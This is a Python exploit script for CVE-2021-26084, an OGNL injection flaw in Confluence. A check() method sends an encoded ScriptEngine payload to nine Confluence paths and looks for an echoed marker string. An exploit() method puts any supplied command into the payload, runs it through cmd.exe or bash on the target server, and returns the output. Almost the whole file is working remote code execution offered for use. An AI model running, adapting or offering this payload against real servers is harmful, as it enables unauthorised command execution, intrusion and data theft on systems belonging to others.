import toolss.utils
import urllib3
import requests
from urllib.parse import urlparse, urljoin
import click
import argparse
from bs4 import BeautifulSoup
import toolss

class CVE_2021_26084:
    
    def __init__(self, target, proxy):
        self.target = target
        self.proxy = proxy
        self.header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        self.verify = False
        self.timeout = 10


    def check(self):
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            paths =  [
		        "/pages/createpage-entervariables.action?SpaceKey=x",
		        "/wiki/pages/createpage-entervariables.action?SpaceKey=x",
		        "/pages/doenterpagevariables.action",
		        "/pages/createpage.action?spaceKey=myproj",
		        "/users/user-dark-features",
		        "/pages/templates2/viewpagetemplate.action",
		        "/template/custom/content-editor",
		        "/templates/editor-preload-container",
		        "/pages/createpage-entervariables.action"
	        ]
            proxy = self.proxy           
            payload = {"queryString": "\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022echo QaxNB12138\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027\r\n"}
            for p in paths:
                s_url = toolss.utils.re_stander_url(self.target)
                url = urljoin(s_url, p)
                reponse = requests.post(url=url, headers=self.header, data=payload, verify=self.verify, timeout=self.timeout, proxies=proxy)
                if reponse.status_code == 200 and "QaxNB12138" in reponse.text:
                    soup = BeautifulSoup(reponse.text, "lxml")
                    content = soup.find("input", {"name":"queryString"})
                    if content:
                        value = content['value'] if content else None
                        print(value)
                        return f"[+] {self.target}存在confluence CVE-2021-26084 RCE Excute Command[echo QaxNB12138]\n[+]result {value.replace("[","").replace("]","").rstrip()}"
                    break
                else:
                    # click.secho(f"[-] {self.target}不存在confluence CVE-2021-26084 RCE ", fg="green")
                    continue
            return f"[-] {self.target}不存在confluence CVE-2021-26084 RCE"                   
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"


    def exploit(self, command):
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            paths =  [
                "/pages/createpage-entervariables.action?SpaceKey=x",
		        "/wiki/pages/createpage-entervariables.action?SpaceKey=x",
		        "/pages/doenterpagevariables.action",
		        "/pages/createpage.action?spaceKey=myproj",
		        "/users/user-dark-features",
		        "/pages/templates2/viewpagetemplate.action",
		        "/template/custom/content-editor",
		        "/templates/editor-preload-container",
		        "/pages/createpage-entervariables.action"
	        ]
            proxy = self.proxy
            
            data = {"queryString": "\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+command+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027\r\n"}
            
            for p in paths:
                s_url = toolss.utils.re_stander_url(self.target)
                url = urljoin(s_url, p)
                res = requests.post(url=url, headers=self.header, proxies=proxy, timeout=self.timeout, verify=self.verify, data=data)
                if res.status_code == 200:
                    soup = BeautifulSoup(res.text, "lxml")
                    content = soup.find("input", {"name":"queryString"})
                    if content:
                        value = content['value'] if content else None                        
                        return value.replace("[","").replace("]","").rstrip()
                    break
                else:
                    continue
            return f"[-] {self.target}不存在confluence CVE-2021-26084 RCE"
            
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
    



